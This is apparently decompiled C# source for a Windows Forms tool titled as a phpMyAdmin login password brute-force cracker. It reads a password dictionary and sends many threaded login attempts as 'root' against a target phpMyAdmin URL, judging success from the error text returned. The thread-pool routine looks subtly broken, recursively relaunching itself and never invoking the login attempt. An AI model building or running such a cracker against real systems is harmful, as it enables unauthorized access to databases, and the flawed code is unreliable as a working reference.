namespace K8_Web_Submit
{
    using System;
    using System.Collections.Generic;
    using System.ComponentModel;
    using System.Drawing;
    using System.IO;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    public class frmphpMyAdminCrack : Form
    {
        private Button btn_Crack;
        private Button btn_loginPassDic;
        private Button btn_loginUserDic;
        private Button btn_webMethodCrack;
        private IContainer components = null;
        private bool K8isAbortScanAdmin;
        private Label label1;
        private Label label18;
        private Label label19;
        private Label label2;
        private Label label3;
        private Label lbl_K8result;
        private TextBox textBox1;
        private TextBox textBox2;
        private TextBox textBox3;
        private TextBox txt_K8result;
        private TextBox txt_k8url;
        private TextBox txt_Threads;
        private WebBrowser web_Result;

        public frmphpMyAdminCrack()
        {
            this.InitializeComponent();
        }

        private void btn_Crack_Click(object sender, EventArgs e)
        {
            this.K8MoreThreadScanAdmin();
        }

        private void btn_StopScanAdmin_Click(object sender, EventArgs e)
        {
            this.K8isAbortScanAdmin = true;
        }

        private void btn_webMethodCrack_Click(object sender, EventArgs e)
        {
            new Thread(() => this.K8threadPoolScanAdmin(this.txt_k8url.Text, int.Parse(this.txt_Threads.Text))) { IsBackground = true }.Start();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void frmphpMyAdminCrack_Load(object sender, EventArgs e)
        {
            base.CenterToParent();
        }

        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(frmphpMyAdminCrack));
            this.btn_loginPassDic = new Button();
            this.textBox3 = new TextBox();
            this.label19 = new Label();
            this.btn_loginUserDic = new Button();
            this.textBox2 = new TextBox();
            this.label18 = new Label();
            this.btn_Crack = new Button();
            this.txt_k8url = new TextBox();
            this.label1 = new Label();
            this.txt_K8result = new TextBox();
            this.txt_Threads = new TextBox();
            this.lbl_K8result = new Label();
            this.label2 = new Label();
            this.label3 = new Label();
            this.textBox1 = new TextBox();
            this.web_Result = new WebBrowser();
            this.btn_webMethodCrack = new Button();
            base.SuspendLayout();
            this.btn_loginPassDic.Location = new Point(0x188, 0x3b);
            this.btn_loginPassDic.Name = "btn_loginPassDic";
            this.btn_loginPassDic.Size = new Size(0x2b, 0x17);
            this.btn_loginPassDic.TabIndex = 80;
            this.btn_loginPassDic.Text = "选择";
            this.btn_loginPassDic.UseVisualStyleBackColor = true;
            this.textBox3.Location = new Point(0x49, 60);
            this.textBox3.Name = "textBox3";
            this.textBox3.Size = new Size(0x139, 0x15);
            this.textBox3.TabIndex = 0x4f;
            this.label19.AutoSize = true;
            this.label19.Location = new Point(11, 0x3f);
            this.label19.Name = "label19";
            this.label19.Size = new Size(0x3b, 12);
            this.label19.TabIndex = 0x4e;
            this.label19.Text = "密码字典:";
            this.btn_loginUserDic.Location = new Point(0x188, 0x22);
            this.btn_loginUserDic.Name = "btn_loginUserDic";
            this.btn_loginUserDic.Size = new Size(0x2b, 0x17);
            this.btn_loginUserDic.TabIndex = 0x4d;
            this.btn_loginUserDic.Text = "选择";
            this.btn_loginUserDic.UseVisualStyleBackColor = true;
            this.textBox2.Location = new Point(0x49, 0x23);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new Size(0x139, 0x15);
            this.textBox2.TabIndex = 0x4c;
            this.label18.AutoSize = true;
            this.label18.Location = new Point(11, 0x26);
            this.label18.Name = "label18";
            this.label18.Size = new Size(0x3b, 12);
            this.label18.TabIndex = 0x4b;
            this.label18.Text = "用户字典:";
            this.btn_Crack.Location = new Point(0x188, 4);
            this.btn_Crack.Name = "btn_Crack";
            this.btn_Crack.Size = new Size(0x47, 0x1a);
            this.btn_Crack.TabIndex = 0x51;
            this.btn_Crack.Text = "开始爆菊";
            this.btn_Crack.UseVisualStyleBackColor = true;
            this.btn_Crack.Click += new EventHandler(this.btn_Crack_Click);
            this.txt_k8url.Location = new Point(0x49, 8);
            this.txt_k8url.Name = "txt_k8url";
            this.txt_k8url.Size = new Size(0x139, 0x15);
            this.txt_k8url.TabIndex = 0x52;
            this.txt_k8url.Text = "http://172.16.126.137/phpMyAdmin/index.php";
            this.label1.AutoSize = true;
            this.label1.Location = new Point(11, 11);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x3b, 12);
            this.label1.TabIndex = 0x53;
            this.label1.Text = "管理地址:";
            this.txt_K8result.Location = new Point(0x1f9, 0x69);
            this.txt_K8result.Multiline = true;
            this.txt_K8result.Name = "txt_K8result";
            this.txt_K8result.ScrollBars = ScrollBars.Vertical;
            this.txt_K8result.Size = new Size(0x1f1, 0x110);
            this.txt_K8result.TabIndex = 0x54;
            this.txt_Threads.Location = new Point(0x1da, 0x3f);
            this.txt_Threads.Name = "txt_Threads";
            this.txt_Threads.Size = new Size(0x25, 0x15);
            this.txt_Threads.TabIndex = 0x55;
            this.txt_Threads.Text = "1000";
            this.lbl_K8result.AutoSize = true;
            this.lbl_K8result.Location = new Point(11, 0x56);
            this.lbl_K8result.Name = "lbl_K8result";
            this.lbl_K8result.Size = new Size(0x3b, 12);
            this.lbl_K8result.TabIndex = 0x56;
            this.lbl_K8result.Text = "爆破结果:";
            this.label2.AutoSize = true;
            this.label2.Location = new Point(0x1b7, 0x42);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x23, 12);
            this.label2.TabIndex = 0x57;
            this.label2.Text = "线程:";
            this.label3.AutoSize = true;
            this.label3.Location = new Point(0x1b7, 0x26);
            this.label3.Name = "label3";
            this.label3.Size = new Size(0x23, 12);
            this.label3.TabIndex = 0x58;
            this.label3.Text = "超时:";
            this.textBox1.Location = new Point(0x1da, 0x24);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0x25, 0x15);
            this.textBox1.TabIndex = 0x59;
            this.textBox1.Text = "5000";
            this.web_Result.Location = new Point(13, 0x69);
            this.web_Result.MinimumSize = new Size(20, 20);
            this.web_Result.Name = "web_Result";
            this.web_Result.Size = new Size(0x1ef, 0x114);
            this.web_Result.TabIndex = 90;
            this.web_Result.DocumentCompleted += new WebBrowserDocumentCompletedEventHandler(this.web_Result_DocumentCompleted);
            this.btn_webMethodCrack.Location = new Point(470, 6);
            this.btn_webMethodCrack.Name = "btn_webMethodCrack";
            this.btn_webMethodCrack.Size = new Size(0x2a, 0x17);
            this.btn_webMethodCrack.TabIndex = 0x5b;
            this.btn_webMethodCrack.Text = "爆破";
            this.btn_webMethodCrack.UseVisualStyleBackColor = true;
            this.btn_webMethodCrack.Click += new EventHandler(this.btn_webMethodCrack_Click);
            base.AutoScaleDimensions = new SizeF(6f, 12f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x3f5, 0x189);
            base.Controls.Add(this.btn_webMethodCrack);
            base.Controls.Add(this.textBox1);
            base.Controls.Add(this.txt_Threads);
            base.Controls.Add(this.label3);
            base.Controls.Add(this.label2);
            base.Controls.Add(this.lbl_K8result);
            base.Controls.Add(this.txt_K8result);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.txt_k8url);
            base.Controls.Add(this.btn_Crack);
            base.Controls.Add(this.btn_loginPassDic);
            base.Controls.Add(this.textBox3);
            base.Controls.Add(this.label19);
            base.Controls.Add(this.btn_loginUserDic);
            base.Controls.Add(this.textBox2);
            base.Controls.Add(this.label18);
            base.Controls.Add(this.web_Result);
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            base.Name = "frmphpMyAdminCrack";
            this.Text = "phpMyAdmin 登陆密码爆力破解   by  K8拉登哥哥";
            base.Load += new EventHandler(this.frmphpMyAdminCrack_Load);
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void K8endTime(int k8count, DateTime K8StartTime)
        {
            this.txt_K8result.AppendText("\r\nScanAdmin Finish!-多线程扫描完毕!");
            DateTime now = DateTime.Now;
            TimeSpan span = new TimeSpan(0, 0, 0);
            span = (TimeSpan) (now - K8StartTime);
            double num2 = Convert.ToDouble(string.Format("{0:0.0}", Convert.ToDouble(span.TotalSeconds.ToString())));
            double num3 = Convert.ToDouble(string.Format("{0:0.0}", Convert.ToDouble(span.TotalMinutes)));
            double num4 = Convert.ToDouble(string.Format("{0:0.0}", Convert.ToDouble(span.TotalHours)));
            StringBuilder builder = new StringBuilder();
            builder.Append(num3.ToString() + " 分钟 == ");
            int num5 = (int) (((double) k8count) / num3);
            this.lbl_K8result.Text = string.Concat(new object[] { this.lbl_K8result.Text, " End: ", now.ToString(), builder, num5.ToString(), " 条/分钟" });
        }

        private void K8MoreThreadScanAdmin()
        {
            string k8url;
            int K8ThreadNum = int.Parse(this.txt_Threads.Text.Trim());
            if (K8ThreadNum == 0)
            {
                MessageBox.Show("最小线程数为1,请重新输入");
                this.txt_Threads.Text = "1";
            }
            else
            {
                this.txt_Threads.Text = this.txt_Threads.Text.TrimStart(new char[] { '0' });
                k8url = this.txt_k8url.Text.Trim();
                new Thread(() => this.K8threadPoolScanAdmin(k8url, K8ThreadNum)) { IsBackground = true }.Start();
                this.K8isAbortScanAdmin = false;
            }
        }

        public void K8phpMyAdminCrack(object li)
        {
            List<string> list = li as List<string>;
            string urlString = list[0];
            string str2 = list[1];
            string str3 = "root";
            byte[] bytes = Encoding.UTF8.GetBytes("pma_username=" + str3 + "&pma_password=" + str2);
            string additionalHeaders = "Content-Type: application/x-www-form-urlencoded ";
            this.web_Result.Navigate(urlString, "", bytes, additionalHeaders);
            string documentText = this.web_Result.DocumentText;
            if ((documentText.Contains("#1045") | documentText.Contains("see AllowNoPassword")) | documentText.Contains("空密码登录被禁止"))
            {
                this.txt_K8result.AppendText("\r\n\r\n------------失败-----------" + str2);
            }
            else
            {
                this.txt_K8result.AppendText("\r\n\r\n------------成功-----------" + str2);
            }
        }

        public void K8scanAdmin(object li)
        {
            List<string> list = li as List<string>;
            string str = list[0];
            string str2 = list[1];
            string str3 = list[2];
            string text = k8submit.PostSubmit(str, "?pma_username=" + "root" + "&pma_password=" + str2, "", 0x1f40, 0xfde9);
            this.txt_K8result.AppendText(text);
        }

        private static void K8sonThreadIsOver()
        {
            while (true)
            {
                int num;
                int num2;
                int num3;
                Thread.Sleep(0x3e8);
                ThreadPool.GetMaxThreads(out num, out num2);
                ThreadPool.GetAvailableThreads(out num3, out num2);
                if ((num - num3) == 0)
                {
                    Console.WriteLine("所有子线程结束了");
                    Thread.Sleep(100);
                    return;
                }
            }
        }

        private DateTime K8startTime()
        {
            DateTime now = DateTime.Now;
            this.lbl_K8result.Text = "Start: " + now.ToString();
            return now;
        }

        private void K8threadPoolScanAdmin(string k8url, int K8ThreadNum)
        {
            ThreadStart start = null;
            string path = Application.StartupPath + @"\mysql.pwd";
            int num = 0;
            ThreadPool.SetMaxThreads(K8ThreadNum, K8ThreadNum);
            DateTime time = this.K8startTime();
            StreamReader reader = null;
            FileStream stream = null;
            StringBuilder builder = null;
            try
            {
                stream = new FileStream(path, FileMode.Open, FileAccess.Read);
                reader = new StreamReader(stream, Encoding.Default);
                builder = new StringBuilder();
                while (!this.K8isAbortScanAdmin)
                {
                    string str2 = reader.ReadLine();
                    if (str2 == null)
                    {
                        break;
                    }
                    string str3 = str2;
                    if (str3.Length != 0)
                    {
                        if (start == null)
                        {
                            start = () => this.K8threadPoolScanAdmin(this.txt_k8url.Text, int.Parse(this.txt_Threads.Text));
                        }
                        new Thread(start) { IsBackground = true }.Start();
                    }
                    num++;
                }
                reader.Close();
                stream.Close();
            }
            catch (Exception)
            {
            }
            K8sonThreadIsOver();
            this.K8endTime(num, time);
        }

        private void web_Result_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
        }
    }
}

